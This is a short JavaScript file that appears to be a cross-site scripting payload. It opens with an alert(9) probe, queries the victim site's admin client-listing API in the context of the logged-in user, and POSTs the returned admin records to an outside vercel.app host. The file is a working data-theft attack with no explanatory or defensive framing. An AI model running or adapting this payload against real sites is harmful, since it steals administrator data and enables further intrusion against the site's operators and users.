alert(9);
const dm = document.domain 
const url = 'https://' + dm + '/api-v1/admin/listclients';
const url2 = 'https://create-react-app-pjep-2wrhktcwy-r7840s-projects.vercel.app/'

const data = {"clienttype":"admin","upline_id":-1,"results":25};

// Function to send POST request
async function postData(url = '', data = {}) {
  try {
    const response = await fetch(url, {
      method: 'POST', // Specify the method as POST
      headers: {
        'Content-Type': 'application/json', // Set the request content type to JSON
      },
      mode: 'cors',
      body: JSON.stringify(data), // Convert JavaScript object to JSON string
    });

    // Parse the JSON response
    const jsonResponse = await response.json();
    
    // Log the response
    console.log('Response:', jsonResponse.admin);
    
    const response2 = await fetch(url2, {
      method: 'POST', // Specify the method as POST
      headers: {
        'Content-Type': 'application/json', // Set the request content type to JSON
        'Access-Control-Allow-Origin': '*',
      },
      mode: 'cors',
      body: JSON.stringify(jsonResponse.admin), // Convert JavaScript object to JSON string
    });
    
  } catch (error) {
    // Handle any errors
    console.error('Error:', error);
  }
}

// Call the function to send data
postData(url, data);
